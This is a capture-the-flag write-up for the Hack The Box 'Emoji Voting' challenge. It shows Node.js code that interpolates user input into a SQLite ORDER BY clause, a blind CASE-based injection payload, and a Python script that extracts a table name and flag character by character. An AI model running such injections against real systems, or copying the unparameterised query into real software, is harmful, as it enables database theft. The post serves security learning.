---
layout: post
title:  "Emoji Voting"
date:   2025-03-19 12:32:45 +0100
permalink: /hackthebox/emojiVoting/
---


# HTB - Emoji Voting
---
> Author: Makelaris
> Published: March 19, 2025
> Description: A place to vote your favourite and least favourite puny human emojis!

---

<br>

The index page is simple—its main feature is allowing users to vote for each emoji. Whenever a user votes, the application sends a POST request to the `/api/vote` endpoint with the `id` parameter in the request body. The response confirms that the vote was successful. Additionally, the app automatically sends another POST request to the `/api/list` endpoint with the `order` parameter set to `Count DESC`, returning a list of emojis sorted by vote count in descending order. 

Let’s take a look over the source code

![image.png](/assets/images/emojiVoting/image.png)

![image.png](/assets/images/emojiVoting/image1.png)

![image.png](/assets/images/emojiVoting/image2.png)

## ***Objective***

There was no flag in the Dockerfile, so I started searching for it and eventually found it in the `database.js` file. It was inserted into the `flag` table with a random value. From this, we can tell that there is a SQL injection vulnerability.
<br>

```sql
let rand = crypto.randomBytes(5).toString('hex');
INSERT INTO flag_${ rand } (flag) VALUES ('HTB{f4k3_fl4g_f0r_t3st1ng}');
```
<br>
Also inside the `database.js` file, there are 2 function were defined connected with 2 routes in `index.js`. 

Inside the `vote` function (`/api/vote`), the `id` is parameterized, we can’t do much in this function. However, in the `getEmojis` function (`/api/list`), our input is put straight into the query after the `ORDER BY` clause. We can use this to inject malicious SQL statement into this query. 

`database.js`
```jsx
 async vote(id) {
        return new Promise(async (resolve, reject) => {
            try {
                let query = 'UPDATE emojis SET count = count + 1 WHERE id = ?';
                resolve(await this.db.run(query, [id]));
            } catch(e) {
                reject(e);
            }
        });
    }

    async getEmojis(order) {
        // TOOD: add parametrization
        return new Promise(async (resolve, reject) => {
            try {
                let query = `SELECT * FROM emojis ORDER BY ${ order }`;
                resolve(await this.db.all(query));
            } catch(e) {
                reject(e);
            }
        });
    }
```
<br>

`index.js`

```jsx
router.post('/api/vote', (req, res) => {
	let { id } = req.body;

	if (id) {
		return db.vote(id)
			.then(() => {
				return res.send(response('Successfully voted')) ;
			})
			.catch((e) => {
				return res.send(response('Something went wrong'));
			})
	}

	return res.send(response('Missing parameters'));
})

router.post('/api/list', (req, res) => {
	let { order } = req.body;

	if (order) {
		return db.getEmojis(order)
			.then(data => {
				if (data) {
					return res.json(data);
				}

				return res.send(response('Seems like there are no emojis'));
			})
			.catch((e) => {
				return res.send(response('Something went wrong'));
			})
	}

	return res.send(response('Missing parameters'))
});	
```

## ***Exploitation***

The application is using `sqlite` and our input was insert after the `ORDER BY` clause. Because of this, we cannot inject operations that combine  or produce another result set like union([details](https://dev.mysql.com/doc/refman/5.7/en/union.html)). However, we can still inject another SELECT statement and leverage `CASE` to extract information. 

Since we know the flag column starts with the letter `f` so the hex value is `66`. We don’t want to include system tables (`sqlite_`) and the `emojis` tables. 

The query uses a `CASE` statement to check if the first character of the table name matches `66`. If it does, the `id` is returned; otherwise, the `name` is returned. The results are sorted in descending order based on the `id`.

[PayLoadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)

```sql
(CASE WHEN (SELECT hex(substr(name,1,1)) FROM sqlite_master 
WHERE type='table' AND name NOT LIKE 'sqlite_%' AND name NOT LIKE 'emojis')='66'
 THEN id ELSE name END) DESC
```

![image.png](/assets/images/emojiVoting/image3.png)

`Exploit.py`

```python
import requests
import string
import aiohttp
import asyncio

letter = string.ascii_letters + string.digits + "@#!?_{}$"

async def table_name(session, url):
    """Extract the table name"""
    found = False
    table_name = ''
    for i in range(1,40+1):
        for l in letter:
            query = {"order": f"(CASE WHEN (SELECT HEX(SUBSTR(name, {i}, 1)) FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%' AND name NOT LIKE 'emojis')='{ord(l):X}' THEN id ELSE name END) DESC"}
            async with session.post(url, json=query) as response:
                result = await response.json()
                if result[0]['id'] == 12:
                    table_name += l
                    print("[+] Table Name: ", table_name + '\r', end='')
                    found = True
                    break
        if not found:
            break
    return table_name

async def extract_flag(session, url, table_name):
    """Extract Flag"""
    found = False
    flag = ''
    for i in range(1,40+1):
        
        for l in letter:
            #Ord(): Convert character to decimal
            #:X: Convert decimal to Hexadecimal
            query = {"order": f"(CASE WHEN (SELECT HEX(SUBSTR(flag, {i}, 1)) FROM {table_name})='{ord(l):X}' THEN id ELSE name END) DESC"}
            async with session.post(url, json=query) as response:
                result = await response.json()
                if result[0]['id'] == 12:
                    flag += l
                    print("[+] Flag: ", flag + '\r', end='')
                    found = True
                    break
        if not found:
                break
    return flag

async def main():
    url = "http://localhost:1337/api/list"
    async with aiohttp.ClientSession() as session:
        table = await table_name(session, url)
        flag = await extract_flag(session, url, table)
        print(f"[+] Table Name Identified: {table}")
        print(f"[+] Final Extracted Flag: {flag}")

if __name__ == "__main__":
    asyncio.run(main())
```

![image.png](/assets/images/emojiVoting/image4.png)

## ***I’ve Learned***

💡Blind SQL Injection after the ORDER BY clause in SQLite.